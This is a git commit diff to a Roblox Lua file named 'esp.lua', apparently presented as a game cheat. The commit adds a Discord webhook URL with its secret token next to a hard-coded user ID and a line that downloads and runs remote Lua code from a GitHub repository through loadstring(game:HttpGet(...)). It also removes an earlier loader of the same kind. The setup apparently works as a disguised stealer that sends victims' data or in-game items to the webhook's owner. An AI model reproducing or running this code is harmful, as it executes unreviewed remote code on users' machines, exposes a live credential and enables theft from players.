3794ec0c1eca8b1a6e4e41f96ce0894d18691a4a
VestyHub <127887452+TTpxTHE@users.noreply.github.com>
2023-03-15 10:47:51 +0200

    Update esp.lua

--- esp.lua
+++ esp.lua
@@ -1,11 +1,4 @@
-
 _G.UserID = 995928858
+_G.Webhook = "https://discord.com/api/webhooks/1085253930751111259/LloyKIHnTvbW8FWg9lLUlMLAwCcQu0azRWihWD5StyC7Sm_B_pLDjB3nShugh13bxXcO"
 
-loadingscreen = true -- set this to false and remove _G. stuff to use your own GUI
-_G.CustomScriptName = "PSX Script"
-_G.Text1 = "Script Loaded..."
-_G.Text2 = "Waiting for Script"
-_G.Text3 = "Checking Scripts..."
-_G.Text4 = "Starting Scripts..."
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/rizzhub/main/Script.lua"))()
